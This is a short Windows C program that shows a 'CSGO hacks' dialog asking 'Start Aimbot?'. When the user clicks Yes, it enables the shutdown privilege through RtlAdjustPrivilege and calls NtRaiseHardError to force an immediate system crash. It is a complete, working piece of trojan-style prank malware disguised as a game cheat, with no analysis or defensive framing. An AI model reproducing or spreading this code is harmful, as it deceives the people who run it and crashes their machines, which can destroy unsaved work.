#include <windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPreInst, LPSTR lpsz, int ncmdShow)
{
	int MsgBoxReturn = MessageBox(0, "Start Aimbot?", "CSGO hacks", MB_YESNO | MB_HELP | MB_ICONEXCLAMATION);
	if (MsgBoxReturn == IDYES)
	{
		BOOLEAN bl;
		unsigned long response;
		RtlAdjustPrivilege(19, true, false, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
		return 0;
	}
}
